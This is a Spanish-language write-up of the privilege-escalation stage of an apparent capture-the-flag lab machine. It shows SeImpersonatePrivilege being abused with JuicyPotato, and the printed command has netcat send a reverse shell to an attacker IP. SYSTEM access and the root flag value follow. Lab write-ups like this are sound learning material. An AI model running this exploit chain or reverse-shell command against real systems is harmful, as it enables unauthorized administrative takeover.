# Escalada de Privilegios

Una vez ganado acceso al sistema, se detectó que el usuario `merlin` posee los siguientes privilegios:

```bash
C:\Windows\Temp\privesc> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled

```

El privilegio `SeImpersonatePrivilege` es considerado como crítico, porque en consecuencia mediante utilidades como '**JuicyPotato.exe**', un usuario no privilegiado que disponga de estos privilegios podría ser capaz de convertirse en administrador local del sistema. 

Una vez alojados los recursos necesarios para ejecutar esta utilidad y ganar acceso al sistema como administradores, se procedió a ejecutar el binario `JuicyPotato.exe` para mediante el binario de Netcat enviar una Shell interactiva por TCP al equipo de atacante:

```bash
C:\Windows\Temp\privesc> JuicyPotato.exe -t * -p C:\Windows\System32\cmd.exe -a "/c C:\Windows\Temp\privesc\nc.exe -e cmd 10.10.16.109 443" -l 1222

Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1222
....
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK
```

Tras su ejecución, se obtuvo acceso al sistema como usuario `nt authority\system`:

```bash
rlwrap nc -nlvp 443
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.93.
Ncat: Connection from 10.10.10.93:49173.
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32> whoami

nt authority\system
```

Para finalizar, se leyó la flag `root.txt` alojada en la ruta `C:\Users\Administrator\Desktop\`:

```bash
C:\Users\Administrator\Desktop> type root.txt

c837f7b699feef5475a0c079f9d4f5ea
```